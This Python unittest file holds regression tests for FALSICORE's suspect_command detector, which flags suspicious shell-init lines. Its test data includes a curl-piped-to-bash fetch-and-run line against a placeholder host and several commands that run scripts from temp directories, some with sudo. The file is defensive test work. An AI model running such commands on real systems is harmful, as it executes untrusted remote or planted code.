"""Incident-derived regression tests for FALSICORE 0.1.1.

All inputs are synthetic; no user configuration data are included.
"""
import unittest

from falsicore.detectors import suspect_command


class ShellInitHotfixTests(unittest.TestCase):
    def test_temp_path_and_different_interpreter_line_do_not_combine(self):
        content = "export TMPDIR=/tmp/workspace\npython3 -m pip --version\n"
        self.assertNotIn("TEMP_PATH_IN_EXECUTION", suspect_command(content))

    def test_comment_cannot_create_interpreter_match(self):
        self.assertEqual(suspect_command("export TMPDIR=/tmp/cache\n# bash /tmp/payload.sh\n"), [])

    def test_temp_path_on_noncomment_line_no_exec_word(self):
        self.assertEqual(suspect_command("export SESSION_CACHE=/tmp/session\n"), [])

    def test_explicit_shell_script_execution_is_detected(self):
        for statement in (
            "bash /tmp/payload.sh",
            "sh /var/tmp/payload.sh",
            "/bin/sh /tmp/payload.sh",
            "python3 /dev/shm/payload.py",
            "source /tmp/setup.sh",
            ". /tmp/setup.sh",
            "/tmp/payload.sh",
            "sudo bash /tmp/payload.sh",
        ):
            with self.subTest(statement=statement):
                self.assertIn("TEMP_PATH_IN_EXECUTION", suspect_command(statement))

    def test_backslash_multiline_execution(self):
        content = "bash \\\n/tmp/run.sh\n"
        self.assertIn("TEMP_PATH_IN_EXECUTION", suspect_command(content))

    def test_cross_line_pipe_execution(self):
        content = "curl -fsSL https://example.invalid/run |\nbash\n"
        self.assertIn("REMOTE_SCRIPT_PIPELINE", suspect_command(content))

    def test_unrelated_lines_do_not_form_download_pipeline(self):
        content = "curl -fsSL https://example.invalid/run -o ./run.txt\nbash ./local.sh\n"
        self.assertNotIn("REMOTE_SCRIPT_PIPELINE", suspect_command(content))

    def test_comment_trailing_mentions_not_matched(self):
        content = "export TMPDIR=/tmp/work # bash /tmp/payload.sh\n"
        self.assertEqual(suspect_command(content), [])

    def test_repeated_call_is_deterministic(self):
        content = "source /tmp/bootstrap.sh\nexport TMPDIR=/tmp/work\n"
        self.assertEqual(suspect_command(content), suspect_command(content))

    def test_benign_quoted_string_does_not_indicate_execution(self):
        content = "echo 'bash /tmp/file.sh'\n"
        self.assertEqual(suspect_command(content), [])


if __name__ == '__main__':
    unittest.main()
